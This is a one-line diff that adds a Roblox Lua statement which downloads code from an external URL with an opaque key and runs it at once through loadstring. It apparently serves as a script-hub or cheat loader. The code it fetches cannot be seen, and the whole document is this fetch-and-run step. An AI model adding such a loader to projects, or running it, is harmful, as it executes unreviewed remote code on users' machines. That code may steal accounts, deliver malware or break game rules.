@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://luafree.vercel.app/api/load/lf_6TyqwlEuCcLNwjuCja849zRJYcNzhGoYeez3mIYh1RU"))()
